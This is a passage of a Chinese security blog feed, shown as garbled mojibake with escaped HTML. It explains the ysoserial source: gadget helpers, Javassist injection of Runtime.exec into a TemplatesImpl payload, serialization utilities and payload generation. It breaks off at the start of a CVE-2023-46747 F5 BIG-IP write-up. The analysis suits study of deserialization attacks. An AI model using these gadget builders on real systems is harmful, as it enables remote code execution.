public static &amp;lt;T&amp;gt; T createProxy ( final InvocationHandler ih, final Class&amp;lt;T&amp;gt; iface, final Class&amp;lt;?&amp;gt;... ifaces ) {
	final Class&amp;lt;?&amp;gt;[] allIfaces = (Class&amp;lt;?&amp;gt;[]) Array.newInstance(Class.class, ifaces.length + 1);
	allIfaces[ 0 ] = iface;
	if ( ifaces.length &amp;gt; 0 ) {
		System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
	}
	//ä½¿ç”¨castè¿›è¡Œç±»å‹è½¬æ¢
	return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™ä¸¤ä¸ªæ–¹æ³•åˆ›å»ºäº†ä»»æ„ä»£ç†ç±»ï¼Œå®ç°äº†åŠ¨æ€åˆ›å»ºä»»æ„æ¥å£çš„å®ç°å¹¶ä¸”è¿›è¡Œè‡ªå®šä¹‰ï¼Œå…¶ä¸­è°ƒç”¨çš„&lt;code&gt;createMemoizedInvocationHandler&lt;/code&gt;æ–¹æ³•åˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰çš„&lt;code&gt;sun.reflect.annotation.AnnotationInvocationHandler&lt;/code&gt;å®ä¾‹ï¼Œç„¶åé€šè¿‡&lt;code&gt;createProxy&lt;/code&gt;åˆ›å»ºä¸€ä¸ªä»£ç†ç±»ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;createMap&lt;/code&gt;æ–¹æ³•&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ä½¿ç”¨ç»™å®šçš„&lt;code&gt;key&lt;/code&gt;å’Œ&lt;code&gt;value&lt;/code&gt;åˆ›å»ºä¸€ä¸ª&lt;code&gt;HashMap&lt;/code&gt;ï¼Œå› ä¸ºysoserialåœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­éœ€è¦é¢‘ç¹åœ°åˆ›å»º&lt;code&gt;HashMap&lt;/code&gt;æ‰€ä»¥å°†è¿™ä¸ªæ“ä½œå°è£…ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ä¸¤ä¸ª&lt;code&gt;createTemplatesImpl&lt;/code&gt;æ–¹æ³•&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;public static Object createTemplatesImpl ( final String command ) throws Exception {
	//æ£€æŸ¥properXalançš„å€¼æ˜¯å¦è¢«è®¾å®šä¸ºäº†Trueï¼Œå¦‚æœæ˜¯é‚£ä¹ˆå°±ä½¿ç”¨ifå—å†…çš„é€»è¾‘ï¼Œå¦åˆ™è°ƒç”¨é‡è½½æ–¹æ³•
	if ( Boolean.parseBoolean(System.getProperty(&quot;properXalan&quot;, &quot;false&quot;)) ) {
		return createTemplatesImpl(
			command,
			Class.forName(&quot;org.apache.xalan.xsltc.trax.TemplatesImpl&quot;),
			Class.forName(&quot;org.apache.xalan.xsltc.runtime.AbstractTranslet&quot;),
			Class.forName(&quot;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&quot;));
	}

	return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
}


public static &amp;lt;T&amp;gt; T createTemplatesImpl ( final String command, Class&amp;lt;T&amp;gt; tplClass, Class&amp;lt;?&amp;gt; abstTranslet, Class&amp;lt;?&amp;gt; transFactory )
throws Exception {
	//åå°„åˆ›å»ºå®ä¾‹
	final T templates = tplClass.newInstance();

	// use template gadget class
	ClassPool pool = ClassPool.getDefault();
	pool.insertClassPath(new ClassClassPath( StubTransletPayload.class));
	pool.insertClassPath(new ClassClassPath(abstTranslet));
	final CtClass clazz = pool.get(StubTransletPayload.class.getName());
	// run command in static initializer
	// TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
	// åˆå§‹åŒ–cmdå­—ç¬¦ä¸²
	String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot; +
	command.replace(&quot;\\&quot;, &quot;\\\\&quot;).replace(&quot;\&quot;&quot;, &quot;\\\&quot;&quot;) +
	&quot;\&quot;);&quot;;
	// æ’å…¥cmdåˆ°é™æ€ä»£ç å—
	clazz.makeClassInitializer().insertAfter(cmd);
	// ç»™ç±»è®¾ç½®åå­— sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
	clazz.setName(&quot;ysoserial.Pwner&quot; + System.nanoTime());
	// è®¾ç½®çˆ¶ç±»
	CtClass superC = pool.get(abstTranslet.getName());
	clazz.setSuperclass(superC);

	// è½¬æ¢ä¸ºå­—èŠ‚ç æ•°ç»„
	final byte[] classBytes = clazz.toBytecode();

	// inject class bytes into instance
	Reflections.setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][] {
		classBytes, ClassFiles.classAsBytes(Foo.class)
	});

	// required to make TemplatesImpl happy
	Reflections.setFieldValue(templates, &quot;_name&quot;, &quot;Pwnr&quot;);
	Reflections.setFieldValue(templates, &quot;_tfactory&quot;, transFactory.newInstance());
	return templates;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™ä¸ªç±»ä¸»è¦æ˜¯ç”¨æ¥åˆå§‹åŒ–&lt;code&gt;TemplatesImpl&lt;/code&gt;çš„ã€‚
ç¬¬ä¸€ä¸ª&lt;code&gt;createTemplatesImpl&lt;/code&gt;æ–¹æ³•é€šè¿‡æ£€æŸ¥&lt;code&gt;properXalan&lt;/code&gt;å±æ€§çš„å€¼æ¥åˆ¤æ–­æ˜¯ä½¿ç”¨å†…ç½®çš„&lt;code&gt;org.apache.xalan.xsltc.trax.TemplatesImpl&lt;/code&gt;è¿˜æ˜¯ä½¿ç”¨å¤–éƒ¨ Apache Xalan é¡¹ç›®æä¾›çš„ç±»ï¼ˆè¿™å¹¶ä¸æ˜¯ä¸€ä¸ªæ ‡å‡†çš„å®˜æ–¹ç³»ç»Ÿå±æ€§ï¼‰ï¼Œå¦‚æœä¸º&lt;code&gt;True&lt;/code&gt;é‚£ä¹ˆå°±ä½¿ç”¨é‡è½½æ–¹æ³•ä¼ å…¥çš„ç±»ã€‚
é‚£ä¹ˆå†æ¥è¯´è¯´é‡è½½æ–¹æ³•ï¼Œå…ˆå®ä¾‹åŒ–äº†ä¸€ä¸ª&lt;code&gt;templates&lt;/code&gt;ï¼Œç„¶åä½¿ç”¨&lt;code&gt;Javassist&lt;/code&gt;è¿›è¡Œå­—èŠ‚ç æ“ä½œï¼Œåˆ›å»ºä¸€ä¸ª&lt;code&gt;ClassPool&lt;/code&gt;çš„å®ä¾‹ï¼Œç„¶åå°†å†…éƒ¨ç±»&lt;code&gt;StubTransletPayload.class&lt;/code&gt;å’Œä¼ å…¥çš„&lt;code&gt;abstTranslet&lt;/code&gt;æ”¾å…¥å…¶ä¸­ï¼Œç„¶åè·å–&lt;code&gt;StubTransletPayload&lt;/code&gt;çš„&lt;code&gt;CtClass&lt;/code&gt;è¡¨ç¤º&lt;code&gt;clazz&lt;/code&gt;ï¼ˆ&lt;code&gt;CtClass&lt;/code&gt;æ˜¯&lt;code&gt;Javassist&lt;/code&gt;ä¸­è¡¨ç¤ºç±»çš„å¯¹è±¡ï¼‰ï¼Œç„¶åå°†&lt;code&gt;command&lt;/code&gt;åŒ…è£…æˆ&lt;code&gt;Runtime&lt;/code&gt;æ‰§è¡Œå‘½ä»¤çš„ä»£ç ï¼Œæœ€åæ’å…¥åˆ°&lt;code&gt;clazz&lt;/code&gt;çš„é™æ€ä»£ç å—ä¸­ï¼Œæœ€åä¿®æ”¹&lt;code&gt;clazz&lt;/code&gt;çš„çˆ¶ç±»ï¼Œå¹¶å°†clazzè½¬æ¢ä¸ºå­—èŠ‚ç æ•°ç»„ã€‚
ä»¥ä¸Šå‡†å¤‡å·¥ä½œåšå®Œåå¼€å§‹ä½¿ç”¨åå°„ä¿®æ”¹&lt;code&gt;templates&lt;/code&gt;çš„&lt;code&gt;_bytecodes&lt;/code&gt;å­—æ®µï¼Œå°†åˆšæ‰å‡†å¤‡å¥½çš„&lt;code&gt;clazz&lt;/code&gt;çš„å­—èŠ‚ç è¡¨ç¤ºå’Œå†…éƒ¨ç±»&lt;code&gt;Foo&lt;/code&gt;å†™å…¥å…¶ä¸­ï¼Œç„¶åè®¾ç½®&lt;code&gt;_name&lt;/code&gt;å­—æ®µå’Œ&lt;code&gt;_tfactory&lt;/code&gt;å­—æ®µï¼Œå…¶ä¸­&lt;code&gt;_tfactory&lt;/code&gt;å­—æ®µéœ€è¦ä¸€ä¸ª&lt;code&gt;TransformerFactoryImpl&lt;/code&gt;å®ä¾‹ï¼Œç”±ä¼ å…¥çš„&lt;code&gt;transFactory&lt;/code&gt;ç±»ä½¿ç”¨åå°„æ¥åˆ›å»ºã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;makeMapæ–¹æ³•&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;public static HashMap makeMap ( Object v1, Object v2 ) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException,
IllegalAccessException, InvocationTargetException {
	HashMap s = new HashMap();
	// åå°„è®¾ç½®sizeå­—æ®µä¸º2
	Reflections.setFieldValue(s, &quot;size&quot;, 2);
	Class nodeC;
	try {
		// å¯¹äºJava8ä¹‹åçš„HashMapï¼Œè·å–java.util.HashMap$Node
		nodeC = Class.forName(&quot;java.util.HashMap$Node&quot;);
	}
	catch ( ClassNotFoundException e ) {
		// å¯¹äºJava8ä¹‹å‰çš„HashMapï¼Œè·å–java.util.HashMap$Entry
		nodeC = Class.forName(&quot;java.util.HashMap$Entry&quot;);
	}
	// è·å–æ„é€ å‡½æ•°å¹¶è®¾ç½®setAccessibleä»¥ä¾›ç›´æ¥è®¿é—®ï¼Œåˆ›å»ºèŠ‚ç‚¹
	Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
	Reflections.setAccessible(nodeCons);

	// åˆ›å»ºæ•°ç»„ç”¨æ¥å­˜å‚¨nodeCèŠ‚ç‚¹
	Object tbl = Array.newInstance(nodeC, 2);
	// å°†v1å’Œv2ä½œä¸ºkeyã€valueæ”¾å…¥åˆ°èŠ‚ç‚¹ä¸­ï¼Œç„¶åå†æ’å…¥æ³•å“¦æ•°ç»„å†…ï¼Œæœ€åå°†æ•°ç»„æ”¾åˆ°HashMapä¸­
	Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
	Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
	Reflections.setFieldValue(s, &quot;table&quot;, tbl);
	return s;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™ä¸ªç±»ç”¨æ¥åˆå§‹åŒ–&lt;code&gt;HashMap&lt;/code&gt;å®ä¾‹ï¼Œé¦–å…ˆåˆ›å»ºä¸€ä¸ª&lt;code&gt;HashMap&lt;/code&gt;ç„¶åè®¾ç½®å…¶å¤§å°ä¸º2ï¼Œæ ¹æ®JDKç‰ˆæœ¬çš„ä¸åŒå†³å®š&lt;code&gt;nodeC&lt;/code&gt;çš„ç±»å‹ç„¶åè·å–å¯¹åº”çš„æ„é€ å‡½æ•°ï¼Œä¹‹ååˆ›å»ºä¸€ä¸ªå¤§å°ä¸º2çš„æ•°ç»„å°†ä¸¤ä¸ªèŠ‚ç‚¹åˆå§‹åŒ–åæ”¾å…¥ï¼ˆèŠ‚ç‚¹çš„&lt;code&gt;key&lt;/code&gt;å’Œ&lt;code&gt;value&lt;/code&gt;éƒ½ä¸º&lt;code&gt;v1&lt;/code&gt;æˆ–&lt;code&gt;v2&lt;/code&gt;ï¼‰ï¼Œæœ€åå°†æ•°ç»„æ”¾å…¥&lt;code&gt;HashMap&lt;/code&gt;ä¸­å¹¶è¿”å›ã€‚&lt;/p&gt;
&lt;h4&gt;JavaVersionç±»&lt;/h4&gt;
&lt;p&gt;è¿™ä¸ªæ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œå°±æ˜¯æ£€æµ‹Javaç‰ˆæœ¬ç”¨çš„ã€‚&lt;/p&gt;
&lt;h4&gt;PayloadRunnerç±»&lt;/h4&gt;
&lt;p&gt;è¿™ä¸ªç±»çœ‹åå­—å°±çŸ¥é“æ˜¯æµ‹è¯•payloadç”¨çš„ï¼Œæ‰§è¡Œä¸€æ¬¡åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œçœ‹èƒ½å¦è¾¾åˆ°é¢„æœŸçš„ç›®çš„ï¼Œä¸è¿‡å¤šè¯´ã€‚&lt;/p&gt;
&lt;h4&gt;Reflectionsç±»&lt;/h4&gt;
&lt;p&gt;è¿™ä¸ªç±»æ˜¯å°†ysoä¸­ç»å¸¸ä½¿ç”¨çš„åå°„æ“ä½œåšä¸€ä¸ªå°è£…æ¥æ–¹ä¾¿ä½¿ç”¨ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;setAccessible&lt;/code&gt;æ–¹æ³•&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;è¿™ä¸ªæ–¹æ³•æ ¹æ®ä½¿ç”¨Javaç‰ˆæœ¬çš„ä¸åŒä¸ºä¼ å…¥çš„&lt;code&gt;member&lt;/code&gt;æ‰§è¡Œ&lt;code&gt;setAccessible&lt;/code&gt;æ“ä½œï¼Œæ¥ä¿®æ”¹&lt;code&gt;Field&lt;/code&gt;ã€&lt;code&gt;Method&lt;/code&gt;æˆ–&lt;code&gt;Constructor&lt;/code&gt;çš„å¯è®¿é—®æ€§ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;getField&lt;/code&gt;æ–¹æ³•&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;è·å–æŒ‡å®šç±»åŠå…¶çˆ¶ç±»ä¸­å£°æ˜çš„ç‰¹å®šå­—æ®µã€‚å¦‚æœåœ¨å½“å‰ç±»ä¸­æ‰¾ä¸åˆ°å­—æ®µï¼Œä¼šé€’å½’åœ°åœ¨å…¶å¤«ç±»ä¸­æŸ¥æ‰¾ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;setFieldValue&lt;/code&gt;å’Œ&lt;code&gt;getFieldValue&lt;/code&gt;æ–¹æ³•&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;è¿™ä¸¤ä¸ªæ–¹æ³•åˆ†åˆ«ç”¨äºè®¾ç½®å’Œè·å–å¯¹è±¡çš„æŒ‡å®šå­—æ®µå€¼ã€‚å®ƒä»¬ä½¿ç”¨&lt;code&gt;getField&lt;/code&gt;æ¥è®¿é—®å­—æ®µï¼Œç„¶åè°ƒç”¨&lt;code&gt;Field.set&lt;/code&gt;æˆ–&lt;code&gt;Field.get&lt;/code&gt;æ¥ä¿®æ”¹æˆ–æ£€ç´¢å€¼ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;getFirstCtor&lt;/code&gt;æ–¹æ³•å’Œ&lt;code&gt;newInstance&lt;/code&gt;æ–¹æ³•&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;è·å–æ„é€ å‡½æ•°å’Œåˆ›å»ºå…¶å¯¹åº”çš„å®ä¾‹æ‰€ä½¿ç”¨çš„æ–¹æ³•ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;createWithoutConstructor&lt;/code&gt;æ–¹æ³•å’Œ&lt;code&gt;createWithConstructor&lt;/code&gt;æ–¹æ³•&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;public static &amp;lt;T&amp;gt; T createWithoutConstructor ( Class&amp;lt;T&amp;gt; classToInstantiate )
throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
	return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);
}

@SuppressWarnings ( {&quot;unchecked&quot;} )
public static &amp;lt;T&amp;gt; T createWithConstructor ( Class&amp;lt;T&amp;gt; classToInstantiate, Class&amp;lt;? super T&amp;gt; constructorClass, Class&amp;lt;?&amp;gt;[] consArgTypes, Object[] consArgs )
throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
	Constructor&amp;lt;? super T&amp;gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);
	setAccessible(objCons);
	// ç”Ÿæˆä¼ªæ„é€ å‡½æ•°
	Constructor&amp;lt;?&amp;gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);
	setAccessible(sc);
	return (T)sc.newInstance(consArgs);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™ä¸¤ä¸ªæ–¹æ³•æ¯”è¾ƒæœ‰æ„æ€ï¼Œ&lt;code&gt;createWithConstructor&lt;/code&gt;ä½¿ç”¨äº†&lt;code&gt;newConstructorForSerialization&lt;/code&gt;æ–¹æ³•åˆ›å»ºä¸€ä¸ªä¼ªæ„é€ å‡½æ•°ï¼Œç„¶åå®ä¾‹åŒ–å¹¶è¿”å›ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;newConstructorForSerialization&lt;/code&gt;æ–¹æ³•ä¸éœ€è¦å¯¹åº”çš„ç±»æœ‰é»˜è®¤æ„é€ å‡½æ•°ï¼Œä¹Ÿä¸éœ€è¦çœŸæ­£åœ°æ‰§è¡Œæ„é€ å‡½æ•°å°±å¯ä»¥ç›´æ¥åˆ›å»ºä¸€ä¸ªå¯¹è±¡å®ä¾‹ã€‚å› ä¸ºå®ƒé€šè¿‡å­—èŠ‚ç çš„å½¢å¼ç”Ÿæˆäº†&lt;code&gt;ConstructorAccessor&lt;/code&gt;æ¥å£ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;ObjectPayloadæ¥å£&lt;/h3&gt;
&lt;p&gt;è¿™ä¸ªæ¥å£æ˜¯æ‰€æœ‰payloadçš„çˆ¶ç±»ï¼Œä¹Ÿå°±æ˜¯é“¾å­å…·ä½“å®ç°çš„çˆ¶ç±»ï¼Œæ¥å£æœ¬èº«æ²¡ä»€ä¹ˆï¼Œä¸è¿‡å®ƒé‡Œé¢è¿˜æœ‰ä¸€ä¸ª&lt;code&gt;Utils&lt;/code&gt;çš„å†…éƒ¨ç±»ï¼Œå¯ä»¥è¯¦ç»†è¯´è¯´è¿™ä¸ªå†…éƒ¨ç±»ä¸­çš„å„ç§æ–¹æ³•ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;getPayloadClasses&lt;/code&gt;æ–¹æ³•&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;è¯¥æ–¹æ³•ç”¨æ¥æŸ¥æ‰¾å’Œè¿”å›æ‰€æœ‰å®ç°äº†&lt;code&gt;ObjectPayload&lt;/code&gt;æ¥å£çš„ç±»ï¼Œæ²¡ä»€ä¹ˆç‰¹åˆ«çš„ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;getPayloadClass&lt;/code&gt;æ–¹æ³•&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;é€šè¿‡åå­—åŠ è½½å…·ä½“çš„é“¾å­å®ç°ï¼Œå¹¶ä¸”åˆ¤æ–­æ˜¯ä¸æ˜¯&lt;code&gt;ObjectPayload&lt;/code&gt;çš„å­ç±»ï¼Œå¦‚æœä¸æ˜¯åˆ™ä¸åŠ è½½ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;makePayloadObject&lt;/code&gt;æ–¹æ³•&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ä½¿ç”¨&lt;code&gt;getPayloadClass&lt;/code&gt;æ–¹æ³•è·å–å…·ä½“çš„é“¾å­çš„ç±»ï¼Œç„¶åå°†å…¶å®ä¾‹åŒ–ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ä¸¤ä¸ª&lt;code&gt;releasePayload&lt;/code&gt;æ–¹æ³•&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ç”¨æ¥æ¸…ç†&lt;code&gt;Payload&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;h3&gt;ReleaseableObjectPayloadæ¥å£&lt;/h3&gt;
&lt;p&gt;è¿™ä¸ªæ¥å£æ˜¯ç”¨æ¥å’Œ&lt;code&gt;releasePayload&lt;/code&gt;æ–¹æ³•é…åˆä½¿ç”¨ï¼Œç”¨æ¥æ¸…ç†é‡Šæ”¾æŒ‡å®š&lt;code&gt;Payload&lt;/code&gt;çš„ã€‚&lt;/p&gt;
&lt;h2&gt;secmgråŒ…&lt;/h2&gt;
&lt;p&gt;è¿™ä¸ªåŒ…é‡Œé¢åŒ…å«äº†ä¸¤ä¸ª&lt;code&gt;SecurityManager&lt;/code&gt;çš„å­ç±»ï¼Œç”¨æ¥æ›´æ”¹å®‰å…¨æ£€æŸ¥çš„ä¸€äº›é€»è¾‘ã€‚&lt;/p&gt;
&lt;h3&gt;DelegateSecurityManagerç±»&lt;/h3&gt;
&lt;p&gt;ä½œä¸ºä¸€ä¸ªä»£ç†ï¼Œç»§æ‰¿è‡ª&lt;code&gt;SecurityManage&lt;/code&gt;ï¼ŒæŒ‡å®šä¸€ä¸ª&lt;code&gt;SecurityManager&lt;/code&gt;å®ä¾‹è¿›è¡Œå®‰å…¨æ£€æŸ¥ç”¨ã€‚
å‰é¢ä¸ºäº†æ”¯æŒ&lt;code&gt;JDK10&lt;/code&gt;ä»¥åçš„å…¼å®¹æ€§ï¼Œå°†&lt;code&gt;getInCheck&lt;/code&gt;ã€&lt;code&gt;checkTopLevelWindow&lt;/code&gt;ã€&lt;code&gt;checkSystemClipboardAccess&lt;/code&gt;ã€&lt;code&gt;checkAwtEventQueueAccess&lt;/code&gt;ã€&lt;code&gt;checkMemberAccess&lt;/code&gt;çš„å…·ä½“å®ç°æ¸…ç©ºã€‚
ç„¶åé‡å†™äº†&lt;code&gt;SecurityManager&lt;/code&gt;ä¸­çš„å¾ˆå¤šæ–¹æ³•ï¼Œå°†å…¶å…·ä½“å¤„ç†å§”æ‰˜ç»™æˆå‘˜å˜é‡&lt;code&gt;securityManager&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;h3&gt;ExecCheckingSecurityManagerç±»&lt;/h3&gt;
&lt;p&gt;è¿™ä¸ªç±»åŒæ ·ç»§æ‰¿è‡ª&lt;code&gt;SecurityManage&lt;/code&gt;ç±»ï¼Œç”¨æ¥æ£€æŸ¥æ˜¯å¦æ‰§è¡Œå‘½ä»¤ï¼Œå¹¶å†³å®šæ˜¯å¦æŠ›å‡ºå¼‚å¸¸ã€‚&lt;/p&gt;
&lt;h2&gt;Deserializerç±»&lt;/h2&gt;
&lt;p&gt;è¿™ä¸ªç±»å°è£…äº†åœ¨ysoä¸­ç»å¸¸ä½¿ç”¨çš„ååºåˆ—åŒ–æ“ä½œï¼Œè¿™æ®µä»£ç å’Œå‰é¢çš„&lt;code&gt;PayloadRunner&lt;/code&gt;é…åˆä½¿ç”¨æ¥æµ‹è¯•&lt;code&gt;payload&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public class Deserializer implements Callable&amp;lt;Object&amp;gt; {
	private final byte[] bytes;

	// å°†æ¥å—çš„å­—èŠ‚æ•°ç»„å­˜å…¥æˆå‘˜å˜é‡
	public Deserializer(byte[] bytes) { this.bytes = bytes; }

	// å®ç°callæ–¹æ³•ï¼Œè°ƒç”¨æ—¶ååºåˆ—åŒ–å­—èŠ‚æ•°ç»„
	public Object call() throws Exception {
		return deserialize(bytes);
	}

	// æ•°ç»„è½¬æ¢ä¸ºæµ
	public static Object deserialize(final byte[] serialized) throws IOException, ClassNotFoundException {
		final ByteArrayInputStream in = new ByteArrayInputStream(serialized);
		return deserialize(in);
	}

	// readobject
	public static Object deserialize(final InputStream in) throws ClassNotFoundException, IOException {
		final ObjectInputStream objIn = new ObjectInputStream(in);
		return objIn.readObject();
	}

	// å…¥å£
	public static void main(String[] args) throws ClassNotFoundException, IOException {
		final InputStream in = args.length == 0 ? System.in : new FileInputStream(new File(args[0]));
		Object object = deserialize(in);
	}
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;Serializerç±»&lt;/h2&gt;
&lt;p&gt;è¿™ä¸ªç±»å°è£…äº†ysoä¸­ç»å¸¸ä½¿ç”¨çš„åºåˆ—åŒ–æ“ä½œï¼Œæä¾›ä¾¿æ·ï¼Œå’Œä¸Šé¢çš„&lt;code&gt;Deserializer&lt;/code&gt;ç±»å¾ˆç›¸ä¼¼ï¼Œä¸è¿‡å¤šè¯´æ˜ã€‚&lt;/p&gt;
&lt;h2&gt;GeneratePayloadç±»&lt;/h2&gt;
&lt;p&gt;åå­—ä¸Šçœ‹å°±æ˜¯ç”Ÿæˆ&lt;code&gt;Payload&lt;/code&gt;ä½¿ç”¨çš„ç±»ï¼Œç®€å•è¯´ä¸‹ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;mian&lt;/code&gt;æ–¹æ³•&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;mian&lt;/code&gt;æ–¹æ³•æ¥å—å‘½ä»¤è¡Œå‚æ•°æ¥é€‰æ‹©é“¾å’Œå‘½ä»¤ï¼Œç„¶åå®ä¾‹åŒ–å¹¶åºåˆ—åŒ–åè¿”å›ï¼Œå¦‚æœå¤±è´¥åˆ™è¿”å›å‰é¢å®šä¹‰å¥½çš„çŠ¶æ€ç ç„¶åé€€å‡ºç¨‹åºã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;printUsage&lt;/code&gt;æ–¹æ³•&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ç”¨æ¥æ‰“å°ysoçš„ä½¿ç”¨æ–¹æ³•ï¼Œä¸è¿‡å¤šè¯´äº†ã€‚&lt;/p&gt;
&lt;h2&gt;Stringsç±»&lt;/h2&gt;
&lt;p&gt;è¿™ä¸ªç±»å°±æ˜¯å°†ä¸€äº›å¸¸ç”¨çš„å­—ç¬¦ä¸²æ–¹æ³•è¿›è¡Œä¸€ä¸ªå°è£…ï¼Œå¦‚è¿æ¥ï¼Œé‡å¤ï¼Œæ ¼å¼åŒ–ã€æ¯”è¾ƒæ“ä½œã€‚&lt;/p&gt;
&lt;h1&gt;Ysoæ˜¯å¦‚ä½•è¿ä½œçš„ï¼Ÿ&lt;/h1&gt;
&lt;p&gt;é‚£ä¹ˆè¯´äº†ä¸Šé¢å¾ˆå¤šçš„åŒ…ä»¥åŠç±»ï¼Œè‚¯å®šæœ‰çš„å°ä¼™ä¼´å¬å®Œè¿˜æ˜¯ä¸€å¤´é›¾æ°´ï¼Œä¸‹é¢å°±ç”¨ä¸€å¼ å›¾è¯´æ˜ä¸‹ysoå…·ä½“æ˜¯æ€ä¹ˆè¿ä½œçš„å§ï¼
&lt;img src=&quot;./ysoserial%E6%BA%90%E7%A0%81%E8%AF%A6%E8%A7%A3/image-20231112221509445.png&quot; alt=&quot;image-20231112221509445&quot; /&gt;
ç”±æ§åˆ¶å°è¿›è¡Œè¾“å…¥ï¼Œè·å–&lt;code&gt;gadget&lt;/code&gt;å’Œéœ€è¦æ‰§è¡Œçš„å‘½ä»¤ä¼ å…¥åˆ°å…¥å£&lt;code&gt;GeneratePayload&lt;/code&gt;ä¸­ï¼Œç„¶åç”±&lt;code&gt;GeneratePayload&lt;/code&gt;è°ƒç”¨å…·ä½“çš„&lt;code&gt;ObjectPayload&lt;/code&gt;æ¥å£çš„å®ç°æ¥è·å–å®ä¾‹ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­&lt;code&gt;ObjectPayload&lt;/code&gt;åˆå»è°ƒç”¨äº†&lt;code&gt;Gadgets&lt;/code&gt;ã€&lt;code&gt;Reflections&lt;/code&gt;ç­‰è¿›è¡Œåˆå§‹åŒ–ç„¶åå°†å¯¹è±¡è¿”å›ç»™&lt;code&gt;GeneratePayload&lt;/code&gt;ï¼Œæœ€å&lt;code&gt;GeneratePayload&lt;/code&gt;è°ƒç”¨&lt;code&gt;Serializer&lt;/code&gt;çš„åºåˆ—åŒ–æ–¹æ³•å°†å…¶åºåˆ—åŒ–åè¿”å›å¹¶æ‰“å°åˆ°æ§åˆ¶å°ã€‚&lt;/p&gt;
</content:encoded></item><item><title>CVE-2023-46747 F5 BIG-IP RCE</title><link>https://www.springkill.club/posts/cve-2023-46747-f5-big-ip-rce/</link><guid isPermaLink="true">https://www.springkill.club/posts/cve-2023-46747-f5-big-ip-rce/</guid><pubDate>Tue, 07 Nov 2023 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;å½±å“ç‰ˆæœ¬&lt;/h2&gt;
&lt;p&gt;å…¨ç‰ˆæœ¬&lt;/p&gt;
&lt;h2&gt;ç¯å¢ƒæ­å»º&lt;/h2&gt;
&lt;p&gt;ç›´æ¥&lt;a href=&quot;https://my.f5.com/manage/s/downloads?productFamily=BIG-IP&amp;amp;productLine=big-ip_v15.x&amp;amp;version=15.1.8&amp;amp;container=Virtual-Edition&amp;amp;files=BIGIP-15.1.8-0.0.7.ALL-vmware.ova&amp;amp;locations=JAPAN&quot;&gt;ä¸‹è½½&lt;/a&gt;é•œåƒç”¨vmwareå¯åŠ¨å³å¯ã€‚&lt;/p&gt;
&lt;p&gt;é»˜è®¤è´¦å·å¯†ç ä¸ºï¼šadmin/default&lt;/p&gt;
&lt;h2&gt;æ¼æ´åˆ†æ&amp;amp;&amp;amp;å¤ç°&lt;/h2&gt;
